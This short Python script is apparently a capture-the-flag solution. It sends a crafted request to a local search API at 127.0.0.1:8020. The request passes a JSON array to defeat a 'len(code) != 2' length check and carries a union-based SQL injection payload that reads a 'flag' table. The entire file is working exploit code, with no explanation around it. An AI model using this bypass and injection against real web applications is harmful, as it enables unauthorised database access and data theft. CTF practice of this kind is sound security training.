import requests


def exploit(payload):
    r = requests.post("http://127.0.0.1:8020/api/search", json={"code": payload})
    print(r.text)

def bypass_len(query):
    ''' Bypass `len(code) != 2` dengan json 2 items'''
    return [query, ""]

if __name__ == "__main__":
    # query = ") union select flag from flag--"
    # payload = bypass_len(query)
    # exploit(payload)
    exploit([") union select flag from flag--", "s", "i--"])